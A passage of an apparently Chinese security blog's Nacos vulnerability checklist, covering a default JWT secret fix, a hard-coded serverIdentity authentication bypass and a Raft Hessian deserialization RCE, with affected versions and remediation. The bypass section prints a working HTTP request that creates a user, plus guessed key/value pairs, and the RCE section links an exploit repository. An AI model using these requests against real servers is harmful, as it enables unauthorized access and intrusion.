+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Authorization: Bearer &lt;jwt token&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230609155215648.png"
+        data-srcset="images/image-20230609155215648.png, images/image-20230609155215648.png 1.5x, images/image-20230609155215648.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230609155215648.png"
+        title="image-20230609155215648" /></p>
+<h3 id="漏洞修复">漏洞修复</h3>
+<ol>
+<li>修改生成 Token 的 secret.key，推荐自定义密钥时，将配置项设置为 Base64 编码的字符串，且原始密钥长度不得低于 32 字符。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#启用认证
+</span></span><span class="line"><span class="cl">nacos.core.auth.enabled=true
+</span></span><span class="line"><span class="cl">#生成 Token 的密钥
+</span></span><span class="line"><span class="cl">nacos.core.auth.plugin.nacos.token.secret.key=base64编码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>升级到2.2.0.1及之后版本。Nacos官方在2023.03.02发布了2.2.0.1，下载地址：https://github.com/alibaba/nacos/releases/tag/2.2.0.1，最新版本：https://github.com/alibaba/nacos/releases。</li>
+</ol>
+<h2 id="七identitykeyvalue-默认值认证绕过">七、identity.key/value 默认值认证绕过</h2>
+<h3 id="漏洞描述-3">漏洞描述</h3>
+<p>当开启 Nacos 权限认证（nacos.core.auth.enabled=true）后，配置文件中存在默认值：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nacos.core.auth.server.identity.key=serverIdentity
+</span></span><span class="line"><span class="cl">nacos.core.auth.server.identity.value=security
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该硬编码导致攻击者可以构造携带该 key 和 value 的请求，从而绕过权限认证。</p>
+<h3 id="漏洞影响-2">漏洞影响</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nacos &lt;= 2.2.0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞复现-3">漏洞复现</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /v1/auth/users HTTP/1.1
+</span></span><span class="line"><span class="cl">serverIdentity: security
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">username=whoami&amp;password=whoami
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当开启 Nacos 权限认证（nacos.core.auth.enabled=true）后，必须填写 nacos.core.auth.server.identity.key 和 nacos.core.auth.server.identity.value 才能够正常启动。若 <code>serverIdentity: security</code> 无法绕过，可以尝试以下键值对：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">官网示例中的键值对 example:example
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">搜索引擎解决方案中出现最多的键值对 test:test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞修复-1">漏洞修复</h3>
+<ol>
+<li>配置自定义身份识别的 key（不可为空）和 value（不可为空）：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nacos.core.auth.server.identity.key=example
+</span></span><span class="line"><span class="cl">nacos.core.auth.server.identity.value=example
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>升级最新版本：https://github.com/alibaba/nacos/releases。</li>
+</ol>
+<h2 id="八nacos-集群-raft-反序列化漏洞">八、Nacos 集群 Raft 反序列化漏洞</h2>
+<h3 id="漏洞描述-4">漏洞描述</h3>
+<p>Nacos 在处理某些基于 Jraft 的请求时，采用 Hessian 进行反序列化，但并未设置限制，导致应用存在远程代码执行（RCE）漏洞。</p>
+<h3 id="漏洞影响-3">漏洞影响</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.4.0 &lt;= Nacos &lt; 1.4.6  使用cluster集群模式运行
+</span></span><span class="line"><span class="cl">2.0.0 &lt;= Nacos &lt; 2.2.3  任意模式启动
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nacos 1.x 在单机模式下默认不开放 7848 端口，故该情况通常不受此漏洞影响。Nacos 2.x 版本无论单机或集群模式均默认开放 7848 端口。</p>
+<h3 id="漏洞复现-4">漏洞复现</h3>
+<p>exp：</p>
+<ul>
+<li><a href="https://github.com/c0olw/NacosRce/" target="_blank" rel="noopener noreffer">https://github.com/c0olw/NacosRce/</a>
+</li>
+</ul>
+<h3 id="漏洞修复-2">漏洞修复</h3>
+<h4 id="通用修补建议">通用修补建议</h4>
+<p>目前官方已发布安全修复更新，受影响用户可以升级到Nacos 1.4.6、Nacos 2.2.3：</p>
+<ul>
+<li>
+<p><a href="https://github.com/alibaba/nacos/releases/tag/1.4.6" target="_blank" rel="noopener noreffer">https://github.com/alibaba/nacos/releases/tag/1.4.6</a>
+</p>
+</li>
+<li>
+<p><a href="https://github.com/alibaba/nacos/releases/tag/2.2.3" target="_blank" rel="noopener noreffer">https://github.com/alibaba/nacos/releases/tag/2.2.3</a>
+</p>
+</li>
+</ul>
+<h4 id="临时修补建议">临时修补建议</h4>
+<p>对外限制开放7848端口，一般使用时该端口为Nacos集群间Raft协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自Nacos集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/nacos-%E6%BC%8F%E6%B4%9E-checklist/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/nacos-%E6%BC%8F%E6%B4%9E-checklist/" data-title="Nacos 漏洞 Checklist" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/nacos-%E6%BC%8F%E6%B4%9E-checklist/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/nacos-%E6%BC%8F%E6%B4%9E-checklist/" data-title="Nacos 漏洞 Checklist"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/nacos-%E6%BC%8F%E6%B4%9E-checklist/" data-title="Nacos 漏洞 Checklist"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/nacos-%E6%BC%8F%E6%B4%9E-checklist/" data-title="Nacos 漏洞 Checklist"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="NetMizer 日志管理系统 cmd.php 远程命令执行漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>NetMizer 日志管理系统 cmd.php 远程命令执行漏洞</a>
+            <a href="/mysql-udf%E6%8F%90%E6%9D%83/" class="next" rel="next" title="MySQL UDF提权">MySQL UDF提权<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
